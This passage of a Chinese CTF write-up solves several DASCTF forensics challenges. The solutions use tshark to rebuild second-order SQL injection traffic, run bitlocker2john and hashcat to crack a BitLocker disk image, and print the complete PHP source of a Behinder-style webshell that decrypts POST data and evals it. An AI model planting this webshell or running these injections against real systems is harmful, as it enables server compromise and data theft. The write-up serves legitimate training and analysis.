N1 // p</span><br><span class="line">        phi = (p ** <span class="number">4</span> - <span class="number">1</span>) * (q ** <span class="number">4</span> - <span class="number">1</span>)</span><br><span class="line">        flag = decrypt(e3, phi, N1, flag_ct)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(flag).decode(<span class="string">&quot;utf8&quot;</span>))</span><br></pre></td></tr></table></figure></div>

<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="题目-一把嗦"><a href="#题目-一把嗦" class="headerlink" title="题目-一把嗦"></a>题目-一把嗦</h2><ol>
<li>分析流量包，找到二次注入的流量规律。</li>
</ol>
<p>利用tshark提取流量请求和响应，便于分析</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tshark -r 1.pcapng -Y &quot;http.request.method == \&quot;POST\&quot;&quot; -T fields -e frame.number -e frame.time_relative -e http.host -e http.request.uri -e http.file_data &gt; req.txt</span><br><span class="line"></span><br><span class="line">  tshark -r 1.pcapng -Y &quot;http.response&quot; -T fields -e frame.number -e tcp.stream -e http.response.code -e http.content_type -e http.file_data &gt; res.txt</span><br></pre></td></tr></table></figure></div>

<p>请求包：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/06/12c80faf9b97ac47.png"
                      alt="null"
                ></p>
<p>一次注册，一次登录，一次查看信息。</p>
<p>响应包：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/06/16dedde90c6dd84a.png"
                      alt="null"
                ></p>
<p>如果响应包存在“您还不是VIP用户啊”说明sql注入后面的判断错误，正确应该是“您是尊贵的VIP用户”，如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1300	16	200	text/html; charset=UTF-8	3c21444f43545950452068746d6c3e0d0a3c68746d6c3e0d0a3c686561643e0d0a202020203c6d65746120636861727365743d227574662d38223e0d0a202020203c7469746c653ee4ba91e79b98e4b88be8bdbde7ab993c2f7469746c653e0d0a3c2f686561643e0d0a3c626f64793e0d0a202020203c646976207374796c653d22746578742d616c69676e3a72696768743b223e0d0a202020203c666f726d206d6574686f643d22706f737422207374796c653d22646973706c61793a696e6c696e653b223e0d0a20202020202020203c627574746f6e206e616d653d22636865636b5f696e666f223ee68891e79a84e4bfa1e681af3c2f627574746f6e3e0d0a202020203c2f666f726d3e0d0a202020207c203c6120687265663d223f6c6f676f75743d31223ee98080e587ba3c2f613e0d0a3c2f6469763e0d0a3c70207374796c653d27636f6c6f723a677265656e3b273ee682a8e698afe5b08ae8b4b5e79a84564950e794a8e688b73c2f703e3c6120687265663d27696e6465782e706870273ee8bf94e59b9e3c2f613e</span><br></pre></td></tr></table></figure></div>

<p>所以定位到响应包中存在“您是尊贵的VIP用户”的流量帧号，前面便是正确的sql注入信息。</p>
<ol>
<li>编写脚本，统计二次注入信息</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_request_file</span>(<span class="params">filename</span>):</span><br><span class="line">    request_dict = &#123;&#125;</span><br><span class="line">    ordered_requests = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">            parts = line.strip().split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">5</span>:</span><br><span class="line">                frame_number = <span class="built_in">int</span>(parts[<span class="number">0</span>])</span><br><span class="line">                request_dict[frame_number] = &#123;</span><br><span class="line">                    <span class="string">&quot;timestamp&quot;</span>: parts[<span class="number">1</span>],</span><br><span class="line">                    <span class="string">&quot;ip&quot;</span>: parts[<span class="number">2</span>],</span><br><span class="line">                    <span class="string">&quot;path&quot;</span>: parts[<span class="number">3</span>],</span><br><span class="line">                    <span class="string">&quot;hexdata&quot;</span>: parts[<span class="number">4</span>]</span><br><span class="line">                &#125;</span><br><span class="line">                ordered_requests.append(frame_number)</span><br><span class="line">    ordered_requests.sort()</span><br><span class="line">    <span class="keyword">return</span> request_dict, ordered_requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_all_vip_frames</span>(<span class="params">response_filename</span>):</span><br><span class="line">    vip_keyword = <span class="string">&quot;您是尊贵的VIP用户&quot;</span></span><br><span class="line">    vip_frames = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(response_filename, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">            parts = line.strip().split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    frame_number = <span class="built_in">int</span>(parts[<span class="number">0</span>])</span><br><span class="line">                    hex_data = parts[<span class="number">4</span>]</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;MISSING&quot;</span> <span class="keyword">in</span> hex_data:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    decoded_data = binascii.unhexlify(hex_data).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                    <span class="keyword">if</span> vip_keyword <span class="keyword">in</span> decoded_data:</span><br><span class="line">                        vip_frames.append((frame_number, decoded_data))</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;解码出错：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vip_frames</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_previous_request_frame</span>(<span class="params">target_frame, request_ordered_list</span>):</span><br><span class="line">    previous_frames = [f <span class="keyword">for</span> f <span class="keyword">in</span> request_ordered_list <span class="keyword">if</span> f &lt; target_frame]</span><br><span class="line">    <span class="keyword">return</span> previous_frames[-<span class="number">1</span>] <span class="keyword">if</span> previous_frames <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_ascii_char</span>(<span class="params">request_content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从请求内容中匹配类似</span></span><br><span class="line"><span class="string">    unicode(substr((SELECT password FROM users WHERE username=&#x27;admin&#x27;),2,1))=97</span></span><br><span class="line"><span class="string">    的数字，并转成对应ASCII字符。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pattern = <span class="string">r&quot;unicode\(substr\(.*?,(\d+),1\)\)=([0-9]+)&quot;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, request_content)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        pos = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">        ascii_code = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">return</span> pos, <span class="built_in">chr</span>(ascii_code)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件路径</span></span><br><span class="line">response_file = <span class="string">r&quot;res.txt&quot;</span></span><br><span class="line">request_file = <span class="string">r&quot;req.txt&quot;</span></span><br><span class="line"></span><br><span class="line">request_dict, request_ordered_list = parse_request_file(request_file)</span><br><span class="line">vip_results = find_all_vip_frames(response_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用 dict 记录密码每个位置字符，方便排序输出</span></span><br><span class="line">password_chars = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> vip_results:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;共找到 <span class="subst">&#123;<span class="built_in">len</span>(vip_results)&#125;</span> 个包含“您是尊贵的VIP用户”的响应：\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> vip_frame, _ <span class="keyword">in</span> vip_results:</span><br><span class="line">        suspected_request_frame = vip_frame - <span class="number">2</span></span><br><span class="line">        previous_frame = find_previous_request_frame(suspected_request_frame, request_ordered_list)</span><br><span class="line">        <span class="keyword">if</span> previous_frame <span class="keyword">and</span> previous_frame <span class="keyword">in</span> request_dict:</span><br><span class="line">            req = request_dict[previous_frame]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                decoded_data = binascii.unhexlify(req[<span class="string">&#x27;hexdata&#x27;</span>]).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                url_decoded_data = urllib.parse.unquote(decoded_data)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                url_decoded_data = <span class="string">f&quot;&lt;解码失败: <span class="subst">&#123;e&#125;</span>&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">            pos, char = extract_ascii_char(url_decoded_data)</span><br><span class="line">            <span class="keyword">if</span> pos <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                password_chars[pos] = char</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;响应帧号：<span class="subst">&#123;vip_frame&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;→ 匹配请求帧号：<span class="subst">&#123;previous_frame&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求时间戳：<span class="subst">&#123;req[<span class="string">&#x27;timestamp&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求路径：<span class="subst">&#123;req[<span class="string">&#x27;path&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求内容（解码+URL解码）：<span class="subst">&#123;url_decoded_data&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> pos <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;提取到密码第 <span class="subst">&#123;pos&#125;</span> 位字符：<span class="subst">&#123;char&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;响应帧号 <span class="subst">&#123;vip_frame&#125;</span> 无对应请求。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据位置排序输出完整密码</span></span><br><span class="line">    <span class="keyword">if</span> password_chars:</span><br><span class="line">        password = <span class="string">&#x27;&#x27;</span>.join(password_chars[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">sorted</span>(password_chars))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n二次注入的flag为：<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;没有找到包含“您是尊贵的VIP用户”的响应。&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>得到flag：REFTQ1RGezk0OGU0Yzg5LTNlMmQtNDllOS04</p>
<p>base64解码：DASCTF{948e4c89-3e2d-49e9-8</p>
<ol>
<li>导出流量中secret.7z文件，爆破vmdk BitLocker密码。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/06/53d9420d1e72c0f4.png"
                      alt="null"
                ></p>
<p>复制后base64解码，解压得到secret.vmdk。R-Studio挂载可以看到BitLocker加密信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/06/73234d6cd7007dcf.png"
                      alt="null"
                ></p>
<p>这里用john配合hashcat爆破：（我这边大概在12w行左右，耗时两分钟）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bitlocker2john.exe -i secret.vmdk</span><br><span class="line"></span><br><span class="line">hashcat -m 22100 1.txt &quot;rockyou.txt&quot;  --show</span><br></pre></td></tr></table></figure></div>

<p>john得：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$bitlocker$0$16$e6e8a55def80a26b3ce0d61b9d112f0f$1048576$12$60a60ae688d4db0103000000$60$0dae77d4126cc7ebdd60b1abf8e2608e30e32c8c06ba18d9bbbf2619369059a8c195beede76c174e1403501c41714c00ce51e0540ec48b10b03b51bf</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/06/3f9213b0381132be.png"
                      alt="null"
                ></p>
<p>密码：esternocleidomastoideo</p>
<p>挂载后可以看到一个<code>5000+3000.txt</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/06/e3d25826e36b7c6d.png"
                      alt="null"
                ></p>
<ol>
<li>AAencode解码+rot8000</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/06/19e91a7247f1590e.png"
                      alt="null"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/06/5680269f14e250fd.png"
                      alt="null"
                ></p>
<p>81a-4ba1ae5dde7e}</p>
<h2 id="题目-Webshell-Plus"><a href="#题目-Webshell-Plus" class="headerlink" title="题目-Webshell Plus"></a>题目-Webshell Plus</h2><p>拿到流量包，放进wireshark进行分析，发现是HTTP流量，前面都是dirsearch的扫描流量</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/05/88546a4fb07aca25.jpg"
                      alt="null"
                ></p>
<p>直接看后面扫描完的部分，就在51770条附近，可以发现这里存在upload页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/05/9709881ef667c251.jpg"
                      alt="null"
                ></p>
<p>跟踪这部分流量也可以看到后面上传了一个shell.php</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/05/93f83971015833e2.jpg"
                      alt="null"
                ></p>
<p>并且响应包也显示上传成功并回显了地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/05/fa889997b81acb16.jpg"
                      alt="null"
                ></p>
<p>后面就是针对这个shell.php的加密流量了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/05/0307b9702971f25e.jpg"
                      alt="null"
                ></p>
<p>那么就得对这个马儿做分析了，熟悉冰蝎webshell的可以很容易的发现，这个木马的后半段就是冰蝎3.0的默认加密方式</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">geneB64RandStr</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$length</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$validChars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>;</span><br><span class="line">    <span class="variable">$maxIndex</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$validChars</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$validChars</span>[<span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="variable">$maxIndex</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;gene_key&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;public_key&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">geneB64RandStr</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;public_key&#x27;</span>]);</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">8</span>));</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$p</span>), <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>] = <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">openssl_public_encrypt</span>(<span class="variable">$p</span>, <span class="variable">$encrypted_key</span>, <span class="variable">$public_key</span>, OPENSSL_PKCS1_PADDING);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$encrypted_key</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">geneB64RandStr</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;OpenSSL extension not available&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">// Default key: rebeyond</span></span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>] = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">    <span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">        <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">                 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>而前半段是一个非对称加密，（实际是出题人在学HTTPS的时候的突发奇想，尝试运用到冰蝎的木马中），这里的流程就是先通过非对称加密算法（RSA）在攻击者本地生成一对公私钥对，而在请求是传递公钥给受害者server，受害者server生成随机值p，进而生成一个共享密钥key，并将这个key用公钥加密后返回。因为只有攻击者有私钥，所以按道理是只能攻击者才能获取这个key，才能解密后面通过对称加密算法加密的通信流量。</p>
<p>于是要破解这个RSA算法，只已知公钥，那只能对这个公钥下手了，先提取出n和e</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">pem_key = base64.b64decode(<span class="string">&quot;LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZU1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTUFEQ0JpQUtCZ0ZnbU95bVQ5RUp2QzhzSFRXeG92MExRV1NvbQpMNURQUmlUVUVuUW5yRG1LWUd2TlNOTUozVjFmUjFocjlqUTZvZXB2UXZqTXlXc3lUTDZKM245bmJPR2Q1dGV5Ci80QkxUWEhReWFYY1NwZmwzejYxZkJKenk5MXJaclhiek1ZMWFkSEg0Vll5VW9EUTdxa0YyL1JWblI4UEpWelIKb0puK1hhSDNSYWJrekhpdEFnTUJBQUU9Ci0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ==&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析 PEM 公钥</span></span><br><span class="line">public_key = serialization.load_pem_public_key(pem_key, backend=default_backend())</span><br><span class="line"></span><br><span class="line">numbers = public_key.public_numbers()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, numbers.n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, numbers.e)</span><br></pre></td></tr></table></figure></div>

<p>n比较大，e很标准。尝试使用yafu分解n，如果p、q相近则很容易分解出来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://c.img.dasctf.com/LightPicture/2025/05/a09861fe795cf507.png"
                      alt="null"
                ></p>
<p>得到pq就很容易算出私钥从而解密获得随机值p了</p>
